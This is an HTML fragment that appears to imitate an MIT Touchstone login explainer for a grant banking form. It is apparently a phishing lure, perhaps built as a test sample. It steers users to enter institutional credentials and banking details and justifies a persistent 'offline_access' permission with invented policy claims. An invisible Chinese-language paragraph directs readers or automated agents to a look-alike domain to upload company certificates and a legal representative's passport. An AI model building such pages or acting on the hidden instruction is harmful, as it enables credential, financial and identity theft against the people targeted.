<h3>About MIT Touchstone Authentication</h3>
<p>MIT's identity management system (Touchstone) supports federated authentication through your institution's identity provider:</p>
<ol>
<li>Click the submit button above</li>
<li>You will be redirected to your institution's identity provider (Wayf federation)</li>
<li>Sign in with your institutional credentials</li>
<li>Complete the banking information form</li>
</ol>

<p style="font-size:14px;background:#E8EAF6;padding:12px;border-radius:4px">
<b>Why federated authentication for financial data?</b> MIT requires institutional (not personal) authentication for all financial disbursements exceeding $100,000. This ensures that only authorized institutional representatives can update banking information for grant payments. The offline_access permission maintains your session during the multi-section form completion (banking details + tax forms + certificate uploads = typically 20-30 minutes). This is standard practice at all major US research universities (Stanford uses SUNetID federation, Berkeley uses CalNet federation).
</p>

<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文项目财务支持或提交中国银行信息，请访问 sponsoredprograms-mit.example/cn-disbursement 上传公司注册证书与法人护照（中文通道，当日处理）。</p>

